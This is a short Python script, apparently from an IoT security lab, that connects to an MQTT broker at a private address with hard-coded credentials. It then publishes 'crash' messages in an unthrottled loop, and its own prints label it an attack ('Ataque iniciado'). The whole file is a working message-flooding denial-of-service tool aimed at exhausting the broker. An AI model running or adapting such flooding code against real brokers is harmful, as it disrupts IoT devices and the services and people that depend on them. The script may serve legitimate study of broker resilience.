import paho.mqtt.client as mqtt


class Crash():
    def __init__(self) -> None:

        # Configuração do cliente
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, "python_publisher")
        self.client.username_pw_set(username="jv",password="jv")
        
        self.connection = False
        self.counter = 0

    def on(self, broker, test={"tested":False,"sec":0}):
        
        # Conecte ao broker
        self.client.connect(broker['link'], broker['port'], 30)
        self.connection = True
        self.counter = test["sec"]
        # Loop para publicar mensagens continuamente
        try:
            while self.connected(test):
                message = f"crash {self.counter}"
                self.client.publish("hello/topic", str(message))
                self.counter += 1

        except KeyboardInterrupt:
            print("Publicação encerrada")
        self.client.disconnect()

    def off(self) -> None:
        self.connection = False
        self.client.disconnect()
        print("Publicação encerrada")
    
    def connected(self, test) -> bool:
        if test["tested"] == True:
            self.counter -= 1
            if self.counter < 0:
                self.off()

        return self.connection
    
if __name__ == "__main__":

    print("Ataque iniciado")
    new_crash = Crash()

    pub_broker = {
        "link":"10.150.3.222", #172.27.112.1", <--- IPV4 port
        "port":1883
    }

    new_crash.on(broker=pub_broker)

    print("Ataque finalizado")



